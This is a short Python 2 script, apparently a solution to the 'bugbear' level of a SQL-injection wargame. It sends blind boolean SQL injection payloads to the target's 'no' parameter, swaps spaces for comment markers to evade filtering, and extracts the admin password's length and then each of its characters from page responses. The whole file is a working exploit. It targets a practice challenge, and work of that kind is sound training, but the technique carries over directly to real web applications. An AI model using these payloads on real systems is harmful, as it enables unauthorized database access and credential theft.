import requests as req
import string
s = req.session()
chrs = string.digits+string.ascii_lowercase+string.ascii_uppercase
cookies = {"PHPSESSID":""}
url = 'https://los.eagle-jump.org/bugbear.php'
#lens
len = 0
for i in xrange(100):
	print '[+] test len = %d' %i
	pay = "1 || (id in(\"admin\") && length(pw) > %d)#"%i
	pay = pay.replace(" ","/**/")
	r = s.get(url,params={'no':pay},cookies=cookies)
	if 'Hello admin' not in r.text:
		print '[found] len = '+str(i)
		len = i
		break

pw = ''
for i in xrange(1,len+1):
	for j in chrs:
		pay = "1 || (id in(\"admin\") && mid(pw,%d,1) in(\"%s\"))#"%(i,j)
		print pay
		pay = pay.replace(" ","/**/")
		r = s.get(url,params={'no':pay},cookies=cookies)
		if 'Hello admin' in r.text:
			pw += j
			print pw
			break
print '[found] pw = '+pw
